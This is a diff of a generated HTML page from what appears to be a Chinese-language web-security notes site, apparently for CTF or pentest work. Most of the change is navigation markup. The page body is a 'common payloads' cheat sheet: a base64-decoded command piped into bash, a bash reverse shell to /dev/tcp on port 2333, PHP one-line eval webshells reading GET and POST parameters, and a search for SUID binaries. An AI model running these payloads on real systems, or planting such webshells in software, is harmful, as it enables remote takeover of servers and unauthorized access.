@@ -12,7 +12,7 @@
         <link rel="prev" href="../etc/RWCTF_ASTLIBRA/">
       
       
-        <link rel="next" href="../../../../Misc/nonebot/">
+        <link rel="next" href="../../../../%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/pwn/cdecl/">
       
       <link rel="icon" href="../../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.5">
@@ -188,6 +188,22 @@
     <li class="md-tabs__item">
       <a href="../../../" class="md-tabs__link md-tabs__link--active">
         Web安全
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/pwn/cdecl/" class="md-tabs__link">
+        二进制安全
       </a>
     </li>
   
@@ -780,12 +796,131 @@
       
       
         <label class="md-nav__link" for="__nav_3" tabindex="0" aria-expanded="false">
+          二进制安全
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="二进制安全" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          二进制安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/pwn/cdecl/" class="md-nav__link">
+        Cdecl
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/pwn/GDB/" class="md-nav__link">
+        GDB
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/pwn/%E5%85%AB%E8%82%A1%E6%96%87/" class="md-nav__link">
+        八股文
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/pwn/%E5%B0%8F%E5%B7%A5%E5%85%B7/" class="md-nav__link">
+        小工具
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/pwn/%E6%A0%88%E8%BF%81%E7%A7%BB/" class="md-nav__link">
+        Stack Exchange
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/pwn/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/" class="md-nav__link">
+        汇编指令
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4" tabindex="0" aria-expanded="false">
           Misc
           <span class="md-nav__icon md-icon"></span>
         </label>
       
       <nav class="md-nav" aria-label="Misc" data-md-level="1">
-        <label class="md-nav__title" for="__nav_3">
+        <label class="md-nav__title" for="__nav_4">
           <span class="md-nav__icon md-icon"></span>
           Misc
         </label>
@@ -799,6 +934,34 @@
     <li class="md-nav__item">
       <a href="../../../../Misc/nonebot/" class="md-nav__link">
         nonebot
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Misc/HTTPS/" class="md-nav__link">
+        HTTPS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Misc/hyper%20V/" class="md-nav__link">
+        打开/关闭hyper V
       </a>
     </li>
   
@@ -904,29 +1067,29 @@
 
 <h1 id="payload">常用payload</h1>
 <h2 id="java-exec">java exec</h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>bash -c {echo,xxx}|{base64,-d}|{bash,-i}
+<div class="highlight"><pre><span></span><code>bash -c {echo,xxx}|{base64,-d}|{bash,-i}
 </code></pre></div>
 <h2 id="base64">base64 命令执行</h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>echo xxx|base64 -d|bash
+<div class="highlight"><pre><span></span><code>echo xxx|base64 -d|bash
 </code></pre></div>
 <h2 id="linuxshell">linux反弹shell</h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>bash -c &#39;bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&#39;
+<div class="highlight"><pre><span></span><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&#39;
 </code></pre></div>
 <h2 id="php">php一句话木马</h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;1&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
-<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
-<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;1&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;1&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+
+<span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;1&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
 </code></pre></div>
 <h2 id="suid">SUID搜索</h2>
 <p><code>find / user root -perm -4000 -print 2&gt;/dev/null</code></p>
 <h2 id="r">去掉\r</h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>tr -d &#39;\r&#39; &lt; a.sh &gt; b.sh
+<div class="highlight"><pre><span></span><code>tr -d &#39;\r&#39; &lt; a.sh &gt; b.sh
 </code></pre></div>
 <h2 id="nginx">nginx目录</h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>/var/www/html/
+<div class="highlight"><pre><span></span><code>/var/www/html/
 </code></pre></div>
 <p>config</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>/etc/nginx/sites-enabled/
+<div class="highlight"><pre><span></span><code>/etc/nginx/sites-enabled/
 </code></pre></div>
 
 
